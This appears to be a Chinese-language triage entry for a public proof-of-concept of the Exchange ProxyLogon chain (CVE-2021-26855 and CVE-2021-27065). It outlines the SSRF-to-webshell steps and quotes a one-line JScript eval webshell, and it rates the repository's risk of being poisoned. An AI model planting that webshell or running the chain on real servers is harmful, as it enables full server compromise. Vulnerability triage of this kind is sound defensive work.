## CVE-2021-26855 & CVE-2021-27065 - Microsoft Exchange Server RCE

**漏洞编号:** CVE-2021-26855

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Exchange Server

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Microsoft Exchange Server 2013 Cumulative Update 21, 2013 Cumulative Update 22, 2013 Cumulative Update 23, 2016 Cumulative Update 8, 2016 Cumulative Update 9, 2016 Cumulative Update 10, 2016 Cumulative Update 11, 2016 Cumulative Update 12, 2016 Cumulative Update 13, 2016 Cumulative Update 14, 2016 Cumulative Update 15, 2016 Cumulative Update 16, 2016 Cumulative Update 17, 2016 Cumulative Update 18, 2016 Cumulative Update 19, 2019 Cumulative Update 1, 2019 Cumulative Update 2, 2019 Cumulative Update 3, 2019 Cumulative Update 4, 2019 Cumulative Update 5, 2019 Cumulative Update 6, 2019 Cumulative Update 7, 2019 Cumulative Update 8

**利用条件:** 需要能够访问目标 Exchange 服务器的网络端口 (通常是443)。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞利用链包括 CVE-2021-26855 (SSRF) 和 CVE-2021-27065 (不安全的反序列化导致RCE)。

**利用方式：**

1.  **SSRF (CVE-2021-26855):** 利用服务器端请求伪造漏洞，攻击者可以发送任意HTTP请求并伪装成Exchange服务器进行身份验证。POC代码首先发送一个NTLM协商请求到`/rpc/`端点，利用返回的`WWW-Authenticate`头中的信息来获取目标Exchange服务器的计算机名和域名。
2.  **RCE (CVE-2021-27065):** 利用获取的计算机名，结合一个已知的邮箱地址格式，构造一个包含`LegacyDN`的请求，发送到`/ecp/baba.js`，最终通过写入webshell来实现远程代码执行。其中，`baba.js`是一个占位符，攻击者可以通过修改这个值，上传任意的webshell。

**有效性：**

根据提供的漏洞信息、搜索结果以及POC代码，可以判断此POC代码是有效的，该漏洞利用是公开的，影响范围广泛。搜索结果也表明该漏洞已被广泛利用。

**投毒风险：**

代码主要功能是利用漏洞，但存在潜在的投毒风险。风险点在于：

*   **Webshell 内容：** Webshell的内容（`<script language="JScript" runat="server">function Page_Load(){eval(Request["babanb"],"unsafe");}</script>`）是固定的，攻击者可能会修改这个内容，植入恶意代码，或者植入更加隐蔽的后门。目前是直接在ecp目录下写了baba.js的文件,比较容易被发现。
*   **依赖项风险：**虽然代码量少，但仍然可能引入有安全风险的第三方库，虽然这里没有体现。
*  **邮件用户列表:** 代码中使用了一个邮件用户列表进行尝试。这个列表可能被修改，用于针对特定目标进行攻击，或者用于搜集敏感信息。

虽然存在风险，但整体代码逻辑较为清晰，风险较低。投毒风险评估为10%。

**项目地址:** [ssrsec/Microsoft-Exchange-RCE](https://github.com/ssrsec/Microsoft-Exchange-RCE)

**漏洞详情:** [CVE-2021-26855](https://nvd.nist.gov/vuln/detail/CVE-2021-26855)